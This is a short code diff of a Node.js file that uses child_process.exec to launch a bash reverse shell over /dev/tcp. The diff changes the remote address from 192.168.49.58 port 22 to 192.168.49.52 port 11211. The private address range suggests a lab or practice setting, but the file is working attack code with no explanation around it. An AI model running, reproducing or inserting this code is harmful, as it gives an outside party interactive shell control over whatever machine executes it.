@@ -1,7 +1,7 @@
 'use strict';
 
 const { exec } = require('child_process');
-const ls = exec("bash -c 'exec bash -i &>/dev/tcp/192.168.49.58/22 <&1'");
+const ls = exec("bash -c 'exec bash -i &>/dev/tcp/192.168.49.52/11211 <&1'");
 
 ls.stdout.on('data', (data) => {
   console.log(`stdout: ${data}`);
